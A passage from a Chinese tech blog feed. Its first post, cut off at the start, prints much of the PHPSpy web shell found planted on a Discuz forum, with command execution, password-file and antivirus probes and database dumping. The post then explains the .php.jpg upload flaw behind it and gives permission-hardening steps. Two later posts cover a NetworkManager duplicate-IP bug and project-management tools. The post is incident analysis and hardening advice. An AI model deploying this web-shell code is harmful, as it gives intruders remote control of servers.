        11 =&gt; array('PHPINFO',(IS_PHPINFO ? '&lt;a href="javascript:g(\'phpinfo\');"&gt;Yes&lt;/a&gt;' : 'No')),
        12 =&gt; array('Safe Mode',getcfg('safe_mode')),
        13 =&gt; array('Administrator',$adminmail),
        14 =&gt; array('allow_url_fopen',getcfg('allow_url_fopen')),
        15 =&gt; array('enable_dl',getcfg('enable_dl')),
        16 =&gt; array('display_errors',getcfg('display_errors')),
        17 =&gt; array('register_globals',getcfg('register_globals')),
        18 =&gt; array('magic_quotes_gpc',getcfg('magic_quotes_gpc')),
        19 =&gt; array('memory_limit',getcfg('memory_limit')),
        20 =&gt; array('post_max_size',getcfg('post_max_size')),
        21 =&gt; array('upload_max_filesize',$upsize),
        22 =&gt; array('max_execution_time',getcfg('max_execution_time').' second(s)'),
        23 =&gt; array('disable_functions',$dis_func),
    );

    if($phpvarname) {
        m($phpvarname .' : '.getcfg($phpvarname));
    }

    formhead(array('title'=&gt;'Server environment'));
    makehide('action','phpenv');
    makeinput(array('title'=&gt;'Please input PHP configuration parameter(eg:magic_quotes_gpc)','name'=&gt;'phpvarname','value'=&gt;$phpvarname,'newline'=&gt;1));
    formfooter();

    $hp = array(0=&gt; 'Server', 1=&gt; 'PHP');
    for($a=0;$a&lt;2;$a++) {
        p('&lt;h2&gt;'.$hp[$a].' &amp;raquo;&lt;/h2&gt;');
        p('&lt;ul class="info"&gt;');
        if ($a==0) {
            for($i=1;$i&lt;=9;$i++) {
                p('&lt;li&gt;&lt;u&gt;'.$info[$i][0].':&lt;/u&gt;'.$info[$i][1].'&lt;/li&gt;');
            }
        } elseif ($a == 1) {
            for($i=10;$i&lt;=23;$i++) {
                p('&lt;li&gt;&lt;u&gt;'.$info[$i][0].':&lt;/u&gt;'.$info[$i][1].'&lt;/li&gt;');
            }
        }
        p('&lt;/ul&gt;');
    }
}//end phpenv

elseif ($action == 'secinfo') {

    secparam('Server software', @getenv('SERVER_SOFTWARE'));
    secparam('Disabled PHP Functions', ($GLOBALS['disable_functions'])?$GLOBALS['disable_functions']:'none');
    secparam('Open base dir', @ini_get('open_basedir'));
    secparam('Safe mode exec dir', @ini_get('safe_mode_exec_dir'));
    secparam('Safe mode include dir', @ini_get('safe_mode_include_dir'));
    secparam('cURL support', function_exists('curl_version')?'enabled':'no');
    $temp=array();
    if(function_exists('mysql_get_client_info'))
        $temp[] = "MySql (".mysql_get_client_info().")";
    if(function_exists('mssql_connect'))
        $temp[] = "MSSQL";
    if(function_exists('pg_connect'))
        $temp[] = "PostgreSQL";
    if(function_exists('oci_connect'))
        $temp[] = "Oracle";
    secparam('Supported databases', implode(', ', $temp));

    if( !IS_WIN ) {
        $userful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzip2','nc','locate','suidperl');
        $danger = array('kav','nod32','bdcored','uvscan','sav','drwebd','clamd','rkhunter','chkrootkit','iptables','ipfw','tripwire','shieldcc','portsentry','snort','ossec','lidsadm','tcplodg','sxid','logcheck','logwatch','sysmask','zmbscap','sawmill','wormscan','ninja');
        $downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');
        secparam('Readable /etc/passwd', @is_readable('/etc/passwd') ? "yes" : 'no');
        secparam('Readable /etc/shadow', @is_readable('/etc/shadow') ? "yes" : 'no');
        secparam('OS version', @file_get_contents('/proc/version'));
        secparam('Distr name', @file_get_contents('/etc/issue.net'));
        $safe_mode = @ini_get('safe_mode');
        if(!$GLOBALS['safe_mode']) {
            $temp=array();
            foreach ($userful as $item)
                if(which($item)){$temp[]=$item;}
            secparam('Userful', implode(', ',$temp));
            $temp=array();
            foreach ($danger as $item)
                if(which($item)){$temp[]=$item;}
            secparam('Danger', implode(', ',$temp));
            $temp=array();
            foreach ($downloaders as $item) 
                if(which($item)){$temp[]=$item;}
            secparam('Downloaders', implode(', ',$temp));
            secparam('Hosts', @file_get_contents('/etc/hosts'));
            secparam('HDD space', execute('df -h'));
            secparam('Mount options', @file_get_contents('/etc/fstab'));
        }
    } else {
        secparam('OS Version',execute('ver'));
        secparam('Account Settings',execute('net accounts'));
        secparam('User Accounts',execute('net user'));
        secparam('IP Configurate',execute('ipconfig -all'));
    }
}//end

else {
    m('Undefined Action');
}

?&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;div style="padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;"&gt;
    &lt;span style="float:right;"&gt;&lt;?php debuginfo();ob_end_flush();?&gt;&lt;/span&gt;
    Powered by &lt;a title="Build 20110502" href="http://www.4ngel.net" target="_blank"&gt;&lt;?php echo str_replace('.','','P.h.p.S.p.y');?&gt; 2011&lt;/a&gt;. Copyright (C) 2004-2011 &lt;a href="http://www.4ngel.net" target="_blank"&gt;Security Angel Team [S4T]&lt;/a&gt; All Rights Reserved.
&lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;

&lt;?php

/*======================================================
函数库
======================================================*/

function secparam($n, $v) {
    $v = trim($v);
    if($v) {
        p('&lt;h2&gt;'.$n.' &amp;raquo;&lt;/h2&gt;');
        p('&lt;div class="infolist"&gt;');
        if(strpos($v, "\n") === false)
            p($v.'&lt;br /&gt;');
        else
            p('&lt;pre&gt;'.$v.'&lt;/pre&gt;');
        p('&lt;/div&gt;');
    }
}
function m($msg) {
    echo '&lt;div style="margin:10px auto 15px auto;background:#ffffe0;border:1px solid #e6db55;padding:10px;font:14px;text-align:center;font-weight:bold;"&gt;';
    echo $msg;
    echo '&lt;/div&gt;';
}
function scookie($key, $value, $life = 0, $prefix = 1) {
    global $timestamp, $_SERVER, $cookiepre, $cookiedomain, $cookiepath, $cookielife;
    $key = ($prefix ? $cookiepre : '').$key;
    $life = $life ? $life : $cookielife;
    $useport = $_SERVER['SERVER_PORT'] == 443 ? 1 : 0;
    setcookie($key, $value, $timestamp+$life, $cookiepath, $cookiedomain, $useport);
}   
function multi($num, $perpage, $curpage, $tablename) {
    $multipage = '';
    if($num &gt; $perpage) {
        $page = 10;
        $offset = 5;
        $pages = @ceil($num / $perpage);
        if($page &gt; $pages) {
            $from = 1;
            $to = $pages;
        } else {
            $from = $curpage - $offset;
            $to = $curpage + $page - $offset - 1;
            if($from &lt; 1) {
                $to = $curpage + 1 - $from;
                $from = 1;
                if(($to - $from) &lt; $page &amp;&amp; ($to - $from) &lt; $pages) {
                    $to = $page;
                }
            } elseif($to &gt; $pages) {
                $from = $curpage - $pages + $to;
                $to = $pages;
                if(($to - $from) &lt; $page &amp;&amp; ($to - $from) &lt; $pages) {
                    $from = $pages - $page + 1;
                }
            }
        }
        $multipage = ($curpage - $offset &gt; 1 &amp;&amp; $pages &gt; $page ? '&lt;a href="javascript:settable(\''.$tablename.'\', \'\', 1);"&gt;First&lt;/a&gt; ' : '').($curpage &gt; 1 ? '&lt;a href="javascript:settable(\''.$tablename.'\', \'\', '.($curpage - 1).');"&gt;Prev&lt;/a&gt; ' : '');
        for($i = $from; $i &lt;= $to; $i++) {
            $multipage .= $i == $curpage ? $i.' ' : '&lt;a href="javascript:settable(\''.$tablename.'\', \'\', '.$i.');"&gt;['.$i.']&lt;/a&gt; ';
        }
        $multipage .= ($curpage &lt; $pages ? '&lt;a href="javascript:settable(\''.$tablename.'\', \'\', '.($curpage + 1).');"&gt;Next&lt;/a&gt;' : '').($to &lt; $pages ? ' &lt;a href="javascript:settable(\''.$tablename.'\', \'\', '.$pages.');"&gt;Last&lt;/a&gt;' : '');
        $multipage = $multipage ? '&lt;p&gt;Pages: '.$multipage.'&lt;/p&gt;' : '';
    }
    return $multipage;
}
// 登陆入口
function loginpage() {
?&gt;
    &lt;style type="text/css"&gt;
    input {font:11px Verdana;BACKGROUND: #FFFFFF;height: 18px;border: 1px solid #666666;}
    &lt;/style&gt;
    &lt;form method="POST" action=""&gt;
    &lt;span style="font:11px Verdana;"&gt;Password: &lt;/span&gt;&lt;input name="password" type="password" size="20"&gt;
    &lt;input type="hidden" name="action" value="login"&gt;
    &lt;input type="submit" value="Login"&gt;
    &lt;/form&gt;
&lt;?php
    exit;
}//end loginpage()

function execute($cfe) {
    $res = '';
    if ($cfe) {
        if(function_exists('system')) {
            @ob_start();
            @system($cfe);
            $res = @ob_get_contents();
            @ob_end_clean();
        } elseif(function_exists('passthru')) {
            @ob_start();
            @passthru($cfe);
            $res = @ob_get_contents();
            @ob_end_clean();
        } elseif(function_exists('shell_exec')) {
            $res = @shell_exec($cfe);
        } elseif(function_exists('exec')) {
            @exec($cfe,$res);
            $res = join("\n",$res);
        } elseif(@is_resource($f = @popen($cfe,"r"))) {
            $res = '';
            while(!@feof($f)) {
                $res .= @fread($f,1024); 
            }
            @pclose($f);
        }
    }
    return $res;
}
function which($pr) {
    $path = execute("which $pr");
    return ($path ? $path : $pr); 
}

function cf($fname,$text){
    if($fp=@fopen($fname,'w')) {
        @fputs($fp,@base64_decode($text));
        @fclose($fp);
    }
}
function dirsize($dir) { 
    $dh = @opendir($dir);
    $size = 0;
    while($file = @readdir($dh)) {
        if ($file != '.' &amp;&amp; $file != '..') {
            $path = $dir.'/'.$file;
            $size += @is_dir($path) ? dirsize($path) : @filesize($path);
        }
    }
    @closedir($dh);
    return $size;
}
// 页面调试信息
function debuginfo() {
    global $starttime;
    $mtime = explode(' ', microtime());
    $totaltime = number_format(($mtime[1] + $mtime[0] - $starttime), 6);
    echo 'Processed in '.$totaltime.' second(s)';
}

//连接MYSQL数据库
function mydbconn($dbhost,$dbuser,$dbpass,$dbname='',$charset='',$dbport='3306') {
    global $charsetdb;
    @ini_set('mysql.connect_timeout', 5);
    if(!$link = @mysql_connect($dbhost.':'.$dbport, $dbuser, $dbpass)) {
        p('&lt;h2&gt;Can not connect to MySQL server&lt;/h2&gt;');
        exit;
    }
    if($link &amp;&amp; $dbname) {
        if (!@mysql_select_db($dbname, $link)) {
            p('&lt;h2&gt;Database selected has error&lt;/h2&gt;');
            exit;
        }
    }
    if($link &amp;&amp; mysql_get_server_info() &gt; '4.1') {
        if($charset &amp;&amp; in_array(strtolower($charset), $charsetdb)) {
            q("SET character_set_connection=$charset, character_set_results=$charset, character_set_client=binary;", $link);
        }
    }
    return $link;
}

// 去掉转义字符
function s_array(&amp;$array) {
    if (is_array($array)) {
        foreach ($array as $k =&gt; $v) {
            $array[$k] = s_array($v);
        }
    } else if (is_string($array)) {
        $array = stripslashes($array);
    }
    return $array;
}

// 清除HTML代码
function html_clean($content) {
    $content = htmlspecialchars($content);
    $content = str_replace("\n", "&lt;br /&gt;", $content);
    $content = str_replace("  ", "&amp;nbsp;&amp;nbsp;", $content);
    $content = str_replace("\t", "&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;", $content);
    return $content;
}

// 获取权限
function getChmod($filepath){
    return substr(base_convert(@fileperms($filepath),10,8),-4);
}

function getPerms($filepath) {
    $mode = @fileperms($filepath);
    if (($mode &amp; 0xC000) === 0xC000) {$type = 's';}
    elseif (($mode &amp; 0x4000) === 0x4000) {$type = 'd';}
    elseif (($mode &amp; 0xA000) === 0xA000) {$type = 'l';}
    elseif (($mode &amp; 0x8000) === 0x8000) {$type = '-';} 
    elseif (($mode &amp; 0x6000) === 0x6000) {$type = 'b';}
    elseif (($mode &amp; 0x2000) === 0x2000) {$type = 'c';}
    elseif (($mode &amp; 0x1000) === 0x1000) {$type = 'p';}
    else {$type = '?';}

    $owner['read'] = ($mode &amp; 00400) ? 'r' : '-'; 
    $owner['write'] = ($mode &amp; 00200) ? 'w' : '-'; 
    $owner['execute'] = ($mode &amp; 00100) ? 'x' : '-'; 
    $group['read'] = ($mode &amp; 00040) ? 'r' : '-'; 
    $group['write'] = ($mode &amp; 00020) ? 'w' : '-'; 
    $group['execute'] = ($mode &amp; 00010) ? 'x' : '-'; 
    $world['read'] = ($mode &amp; 00004) ? 'r' : '-'; 
    $world['write'] = ($mode &amp; 00002) ? 'w' : '-'; 
    $world['execute'] = ($mode &amp; 00001) ? 'x' : '-'; 

    if( $mode &amp; 0x800 ) {$owner['execute'] = ($owner['execute']=='x') ? 's' : 'S';}
    if( $mode &amp; 0x400 ) {$group['execute'] = ($group['execute']=='x') ? 's' : 'S';}
    if( $mode &amp; 0x200 ) {$world['execute'] = ($world['execute']=='x') ? 't' : 'T';}

    return $type.$owner['read'].$owner['write'].$owner['execute'].$group['read'].$group['write'].$group['execute'].$world['read'].$world['write'].$world['execute'];
}

function getUser($filepath)     {
    if (function_exists('posix_getpwuid')) {
        $array = @posix_getpwuid(@fileowner($filepath));
        if ($array &amp;&amp; is_array($array)) {
            return ' / &lt;a href="#" title="User: '.$array['name'].'&amp;#13&amp;#10Passwd: '.$array['passwd'].'&amp;#13&amp;#10Uid: '.$array['uid'].'&amp;#13&amp;#10gid: '.$array['gid'].'&amp;#13&amp;#10Gecos: '.$array['gecos'].'&amp;#13&amp;#10Dir: '.$array['dir'].'&amp;#13&amp;#10Shell: '.$array['shell'].'"&gt;'.$array['name'].'&lt;/a&gt;';
        }
    }
    return '';
}

// 删除目录
function deltree($deldir) {
    $mydir=@dir($deldir);   
    while($file=$mydir-&gt;read())     {       
        if((is_dir($deldir.'/'.$file)) &amp;&amp; ($file!='.') &amp;&amp; ($file!='..')) { 
            @chmod($deldir.'/'.$file,0777);
            deltree($deldir.'/'.$file); 
        }
        if (is_file($deldir.'/'.$file)) {
            @chmod($deldir.'/'.$file,0777);
            @unlink($deldir.'/'.$file);
        }
    } 
    $mydir-&gt;close(); 
    @chmod($deldir,0777);
    return @rmdir($deldir) ? 1 : 0;
}

// 表格行间的背景色替换
function bg() {
    global $bgc;
    return ($bgc++%2==0) ? 'alt1' : 'alt2';
}

// 获取当前的文件系统路径
function getPath($scriptpath, $nowpath) {
    if ($nowpath == '.') {
        $nowpath = $scriptpath;
    }
    $nowpath = str_replace('\\', '/', $nowpath);
    $nowpath = str_replace('//', '/', $nowpath);
    if (substr($nowpath, -1) != '/') {
        $nowpath = $nowpath.'/';
    }
    return $nowpath;
}

// 获取当前目录的上级目录
function getUpPath($nowpath) {
    $pathdb = explode('/', $nowpath);
    $num = count($pathdb);
    if ($num &gt; 2) {
        unset($pathdb[$num-1],$pathdb[$num-2]);
    }
    $uppath = implode('/', $pathdb).'/';
    $uppath = str_replace('//', '/', $uppath);
    return $uppath;
}

// 检查PHP配置参数
function getcfg($varname) {
    $result = get_cfg_var($varname);
    if ($result == 0) {
        return 'No';
    } elseif ($result == 1) {
        return 'Yes';
    } else {
        return $result;
    }
}

// 检查函数情况
function getfun($funName) {
    return (false !== function_exists($funName)) ? 'Yes' : 'No';
}

// 获得文件扩展名
function getext($file) {
    $info = pathinfo($file);
    return $info['extension'];
}

function GetWDirList($dir){
    global $dirdata,$j,$nowpath;
    !$j &amp;&amp; $j=1;
    if ($dh = opendir($dir)) {
        while ($file = readdir($dh)) {
            $f=str_replace('//','/',$dir.'/'.$file);
            if($file!='.' &amp;&amp; $file!='..' &amp;&amp; is_dir($f)){
                if (is_writable($f)) {
                    $dirdata[$j]['filename']=str_replace($nowpath,'',$f);
                    $dirdata[$j]['mtime']=@date('Y-m-d H:i:s',filemtime($f));
                    $dirdata[$j]['dirchmod']=getChmod($f);
                    $dirdata[$j]['dirperm']=getPerms($f);
                    $dirdata[$j]['dirlink']=$dir;
                    $dirdata[$j]['server_link']=$f;
                    $j++;
                }
                GetWDirList($f);
            }
        }
        closedir($dh);
        clearstatcache();
        return $dirdata;
    } else {
        return array();
    }
}

function GetWFileList($dir){
    global $filedata,$j,$nowpath, $writabledb;
    !$j &amp;&amp; $j=1;
    if ($dh = opendir($dir)) {
        while ($file = readdir($dh)) {
            $ext = getext($file);
            $f=str_replace('//','/',$dir.'/'.$file);
            if($file!='.' &amp;&amp; $file!='..' &amp;&amp; is_dir($f)){
                GetWFileList($f);
            } elseif($file!='.' &amp;&amp; $file!='..' &amp;&amp; is_file($f) &amp;&amp; in_array($ext, explode(',', $writabledb))){
                if (is_writable($f)) {
                    $filedata[$j]['filename']=str_replace($nowpath,'',$f);
                    $filedata[$j]['size']=sizecount(@filesize($f));
                    $filedata[$j]['mtime']=@date('Y-m-d H:i:s',filemtime($f));
                    $filedata[$j]['filechmod']=getChmod($f);
                    $filedata[$j]['fileperm']=getPerms($f);
                    $filedata[$j]['fileowner']=getUser($f);
                    $filedata[$j]['dirlink']=$dir;
                    $filedata[$j]['server_link']=$f;
                    $j++;
                }
            }
        }
        closedir($dh);
        clearstatcache();
        return $filedata;
    } else {
        return array();
    }
}

function GetSFileList($dir, $content, $re = 0) {
    global $filedata,$j,$nowpath, $writabledb;
    !$j &amp;&amp; $j=1;
    if ($dh = opendir($dir)) {
        while ($file = readdir($dh)) {
            $ext = getext($file);
            $f=str_replace('//','/',$dir.'/'.$file);
            if($file!='.' &amp;&amp; $file!='..' &amp;&amp; is_dir($f)){
                GetSFileList($f, $content, $re = 0);
            } elseif($file!='.' &amp;&amp; $file!='..' &amp;&amp; is_file($f) &amp;&amp; in_array($ext, explode(',', $writabledb))){
                $find = 0;
                if ($re) {
                    if ( preg_match('@'.$content.'@',$file) || preg_match('@'.$content.'@', @file_get_contents($f)) ){
                        $find = 1;
                    }
                } else {
                    if ( strstr($file, $content) || strstr( @file_get_contents($f),$content ) ) {
                        $find = 1;
                    }
                }
                if ($find) {
                    $filedata[$j]['filename']=str_replace($nowpath,'',$f);
                    $filedata[$j]['size']=sizecount(@filesize($f));
                    $filedata[$j]['mtime']=@date('Y-m-d H:i:s',filemtime($f));
                    $filedata[$j]['filechmod']=getChmod($f);
                    $filedata[$j]['fileperm']=getPerms($f);
                    $filedata[$j]['fileowner']=getUser($f);
                    $filedata[$j]['dirlink']=$dir;
                    $filedata[$j]['server_link']=$f;
                    $j++;
                }
            }
        }
        closedir($dh);
        clearstatcache();
        return $filedata;
    } else {
        return array();
    }
}

function qy($sql) { 
    global $mysqllink;
    //echo $sql.'&lt;br&gt;';
    $res = $error = '';
    if(!$res = @mysql_query($sql,$mysqllink)) { 
        return 0;
    } else if(is_resource($res)) {
        return 1; 
    } else {
        return 2;
    }   
    return 0;
}

function q($sql) { 
    global $mysqllink;
    return @mysql_query($sql,$mysqllink);
}

function fr($qy){
    mysql_free_result($qy);
}

function sizecount($fileSize) {
    $size = sprintf("%u", $fileSize);
    if($size == 0) {
        return '0 Bytes' ;
    }
    $sizename = array(' Bytes', ' KB', ' MB', ' GB', ' TB', ' PB', ' EB', ' ZB', ' YB');
    return round( $size / pow(1024, ($i = floor(log($size, 1024)))), 2) . $sizename[$i];
}
// 备份数据库
function sqldumptable($table, $fp=0) {
    global $mysqllink;

    $tabledump = "DROP TABLE IF EXISTS `$table`;\n";
    $res = q("SHOW CREATE TABLE $table");
    $create = mysql_fetch_row($res);
    $tabledump .= $create[1].";\n\n";

    if ($fp) {
        fwrite($fp,$tabledump);
    } else {
        echo $tabledump;
    }
    $tabledump = '';
    $rows = q("SELECT * FROM $table");
    while ($row = mysql_fetch_assoc($rows)) {
        foreach($row as $k=&gt;$v) {
            $row[$k] = "'".@mysql_real_escape_string($v)."'";
        }
        $tabledump = 'INSERT INTO `'.$table.'` VALUES ('.implode(", ", $row).');'."\n";
        if ($fp) {
            fwrite($fp,$tabledump);
        } else {
            echo $tabledump;
        }
    }
    fwrite($fp,"\n\n");
    fr($rows);
}

function p($str){
    echo $str."\n";
}

function tbhead() {
    p('&lt;table width="100%" border="0" cellpadding="4" cellspacing="0"&gt;');
}
function tbfoot(){
    p('&lt;/table&gt;');
}

function makehide($name,$value=''){
    p("&lt;input id=\"$name\" type=\"hidden\" name=\"$name\" value=\"$value\" /&gt;");
}

function makeinput($arg = array()){
    $arg['size'] = $arg['size'] &gt; 0 ? "size=\"$arg[size]\"" : "size=\"100\"";
    $arg['extra'] = $arg['extra'] ? $arg['extra'] : '';
    !$arg['type'] &amp;&amp; $arg['type'] = 'text';
    $arg['title'] = $arg['title'] ? $arg['title'].'&lt;br /&gt;' : '';
    $arg['class'] = $arg['class'] ? $arg['class'] : 'input';
    if ($arg['newline']) {
        p("&lt;p&gt;$arg[title]&lt;input class=\"$arg[class]\" name=\"$arg[name]\" id=\"$arg[name]\" value=\"$arg[value]\" type=\"$arg[type]\" $arg[size] $arg[extra] /&gt;&lt;/p&gt;");
    } else {
        p("$arg[title]&lt;input class=\"$arg[class]\" name=\"$arg[name]\" id=\"$arg[name]\" value=\"$arg[value]\" type=\"$arg[type]\" $arg[size] $arg[extra] /&gt;");
    }
}

function makeselect($arg = array()){
    if ($arg['onchange']) {
        $onchange = 'onchange="'.$arg['onchange'].'"';
    }
    $arg['title'] = $arg['title'] ? $arg['title'] : '';
    if ($arg['newline']) p('&lt;p&gt;');
    p("$arg[title] &lt;select class=\"input\" id=\"$arg[name]\" name=\"$arg[name]\" $onchange&gt;");
        if (is_array($arg['option'])) {
            if ($arg['nokey']) {
                foreach ($arg['option'] as $value) {
                    if ($arg['selected']==$value) {
                        p("&lt;option value=\"$value\" selected&gt;$value&lt;/option&gt;");
                    } else {
                        p("&lt;option value=\"$value\"&gt;$value&lt;/option&gt;");
                    }
                }
            } else {
                foreach ($arg['option'] as $key=&gt;$value) {
                    if ($arg['selected']==$key) {
                        p("&lt;option value=\"$key\" selected&gt;$value&lt;/option&gt;");
                    } else {
                        p("&lt;option value=\"$key\"&gt;$value&lt;/option&gt;");
                    }
                }
            }
        }
    p("&lt;/select&gt;");
    if ($arg['newline']) p('&lt;/p&gt;');
}
function formhead($arg = array()) {
    global $self;
    !$arg['method'] &amp;&amp; $arg['method'] = 'post';
    !$arg['action'] &amp;&amp; $arg['action'] = $self;
    $arg['target'] = $arg['target'] ? "target=\"$arg[target]\"" : '';
    !$arg['name'] &amp;&amp; $arg['name'] = 'form1';
    p("&lt;form name=\"$arg[name]\" id=\"$arg[name]\" action=\"$arg[action]\" method=\"$arg[method]\" $arg[target]&gt;");
    if ($arg['title']) {
        p('&lt;h2&gt;'.$arg['title'].' &amp;raquo;&lt;/h2&gt;');
    }
}

function maketext($arg = array()){
    !$arg['cols'] &amp;&amp; $arg['cols'] = 100;
    !$arg['rows'] &amp;&amp; $arg['rows'] = 25;
    $arg['title'] = $arg['title'] ? $arg['title'].'&lt;br /&gt;' : '';
    p("&lt;p&gt;$arg[title]&lt;textarea class=\"area\" id=\"$arg[name]\" name=\"$arg[name]\" cols=\"$arg[cols]\" rows=\"$arg[rows]\" $arg[extra]&gt;$arg[value]&lt;/textarea&gt;&lt;/p&gt;");
}

function formfooter($name = ''){
    !$name &amp;&amp; $name = 'submit';
    p('&lt;p&gt;&lt;input class="bt" name="'.$name.'" id="'.$name.'" type="submit" value="Submit"&gt;&lt;/p&gt;');
    p('&lt;/form&gt;');
}

function goback(){
    global $self, $nowpath;
    p('&lt;form action="'.$self.'" method="post"&gt;&lt;input type="hidden" name="action" value="file" /&gt;&lt;input type="hidden" name="dir" value="'.$nowpath.'" /&gt;&lt;p&gt;&lt;input class="bt" type="submit" value="Go back..."&gt;&lt;/p&gt;&lt;/form&gt;');
}

function formfoot(){
    p('&lt;/form&gt;');
}

function encode_pass($pass) {
    $pass = md5('angel'.$pass);
    $pass = md5($pass.'angel');
    $pass = md5('angel'.$pass.'angel');
    return $pass;
}

function pr($s){
    echo "&lt;pre&gt;".print_r($s).'&lt;/pre&gt;';
}

?&gt;
</pre>

<p>
上面的脚本被恶意用户完成对系统的远程控制。
</p></li>
</ul>
</div>
</div>

<div id="outline-container-orgc5ad7b4" class="outline-2">
<h2 id="orgc5ad7b4">问题根源</h2>
<div class="outline-text-2" id="text-orgc5ad7b4">
<p>
这次发现的恶意代码注入应该是之前的一次 <code>nginx</code> 和 <code>php</code> <a href="http://www.oschina.net/translate/10-tips-for-securing-nginx#translate_28443">安全漏洞</a> 引起，当时由 <code>WooYun.org</code> 汇报，原来已经被恶意用户种下了这些后门。
</p>

<p>
这个漏洞简言之就是用户可以上传文件后缀为 <code>.php.jpg</code> 的文件，在外部访问时直接被当做 <code>php</code> 执行，罪魁祸首归结为以下三点：
</p>

<ul class="org-ul">
<li><code>php</code> 配置</li>

<li><code>nginx</code> 配置</li>

<li><p>
<code>discuz</code>
</p>

<p>
允许上传文件名指定后缀为 <code>.php.jpg</code>
</p></li>
</ul>
</div>
</div>

<div id="outline-container-orgff659d9" class="outline-2">
<h2 id="orgff659d9">加固措施</h2>
<div class="outline-text-2" id="text-orgff659d9">
<ul class="org-ul">
<li>采用更严格的文件目录权限

<ul class="org-ul">
<li><p>
列出属主不应该为 <code>nobody</code> 的目录：
</p>

<div class="org-src-container">
<pre class="src src-sh">find . -type d  | xargs ls -lad | grep nobody | grep -v <span style="color: #8abeb7;">'/data'</span>
</pre>
</div>

<p>
除 <code>discuz</code> 要求为可写的目录（路径名包启/data）外，其它所有文件及目录属主都改为非 <code>nobody</code> 用户。
</p>

<p>
需要注意的是 <code>source/plugin/</code> 下的所有目录需要为所有用户添加上可执行权限（特别是自已开发并上传解压的插件），否则访问插件时会出现以下错误提示：
</p>

<pre class="example">
         指定的插件模块文件(XXXXXXXXXX)不存在或存在语法错误，请检查是否已将插件完整上传
</pre></li>

<li><p>
列出属主不应该为 <code>nobody</code> 的文件：
</p>

<div class="org-src-container">
<pre class="src src-sh">find . -type f  | xargs ls -la | grep nobody | grep -v <span style="color: #8abeb7;">'/data'</span>
</pre>
</div>

<p>
除 <code>discuz</code> 要求为可写的文件（路径名包启/data）外，其它所有文件属主都改为非 <code>nobody</code> 用户。
</p></li>

<li><p>
列出 <code>nobody</code> 可写的文件
</p>

<div class="org-src-container">
<pre class="src src-sh">find . -type f ! -perm 0644  | xargs ls -la | grep -v <span style="color: #8abeb7;">'/data/'</span>
</pre>
</div>

<p>
收回非必要的写权限。
</p></li>
</ul></li>

<li>确保上传目录中的 <code>php</code> 文件不会被当做 <code>php</code> 执行

<ul class="org-ul">
<li>data/attachment</li>
<li>uc_server/data/avatar</li>
<li>uc_server/data/tmp</li>
</ul></li>
</ul>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Archlinux网络接口上出现两个IP]]></title>
            <link>/article/archlinux-7f517edc63a553e34e0a51fa73b04e244e2a-ip.html</link>
            <guid>/article/archlinux-7f517edc63a553e34e0a51fa73b04e244e2a-ip.html</guid>
            <pubDate>Wed, 12 Mar 2014 03:32:00 GMT</pubDate>
            <content:encoded><![CDATA[<ul class="org-ul">
<li><p>
发现两个IP
</p>

<p>
我的电脑是直接连到公司的墙上的网口上网的，在测试路由器的时候，我把路由器的WAN口接墙上的网口，然后电脑连到路由器的LAN口上，上网正常。查看分配到的IP为192.168.111.2，路由器的IP为192.168.111.1， 想到我一直用 <code>192.168.90.73</code> 这个IP，有些配置也依赖这个IP，所以还想分到这个IP，所以把路由器的DHCP做了设置，路由器IP改为192.168.90.74，分配的IP范围为192.168.90.71-192.168.90.73，再次重连电脑分配的IP为192.168.90.71，然后发现上不了网了，浏览器上输入路由器的IP（192.168.90.74）竟然打开了我机器（192.168.90.71）上建的WEB服务，其他人连这个网络却可以通过192.168.90.74这个IP正常打开路由器界面，最终通过“ip address show”这个命令发现我的网口上有两个IP（192.168.90.71、192.168.90.74）， <code>ipconfig</code> 和其它GUI工具只能看到第一个IP。
</p></li>

<li><p>
第二个IP是怎么来的？
</p>

<p>
抓包分析了一下DHCP网络包，只给分配了192.168.90.71这个IP，看来192.168.90.74这个IP是我机器上配置的，于是搜索/etc、/var下的文件，最后在/var/log/journal/*/system.journal中找到了日志：
</p>

<pre class="example">
NetworkManager[375]: &lt;debug&gt; [1394509845.924245] [nm-system.c:280] sync_addresses(): (eno1): adding address '192.168.90.74/24'
</pre>

<p>
然后在NetworkManager的配置文件 <code>/etc/NetworkManager/system-connections/Profile 1</code> 中找到了相关配置：
</p>

<pre class="example">
[ipv4]
method=auto
address1=192.168.90.74/24,192.168.90.2
</pre>

<p>
删除掉 <code>address1</code> 后，再重连网络，就只有一个IP了。
</p>

<p>
这应该是 <code>NetworkManager</code> 的一个 <a href="https://bugs.archlinux.org/task/41395">BUG</a> ，当手动设置IP后切回DHCP自动获取IP方式时不清除手动设置的时会出现。</p></li>
</ul>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[开源项目管理系统：trac]]></title>
            <link>/article/5f006e90987976ee7ba174067cfb7edfff1a-trac.html</link>
            <guid>/article/5f006e90987976ee7ba174067cfb7edfff1a-trac.html</guid>
            <pubDate>Sun, 09 Mar 2014 16:44:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
最近负责为公司搭建项目管理系统，有如下要求：
</p>
<ul class="org-ul">
<li>支持BUG管理</li>

<li>支持帐号管理</li>

<li>支持WIKI</li>

<li>支持任务分配</li>

<li>支持中文</li>
</ul>

<p>
由于时间紧迫，感觉 <code>redmine</code> 界面更漂亮，相关资料也好找，而且帐号管理、中文支持方面的很不错，所以选择了 <code>redmine</code> 。其实心里面一直希望选的是基于 <code>python</code> 开发的系统，一方面自已喜欢 <code>python</code> ，另外团队中对 <code>python</code> 熟悉的人比较多，这样后面需要做二次开发时会容易一些。
</p>

<p>
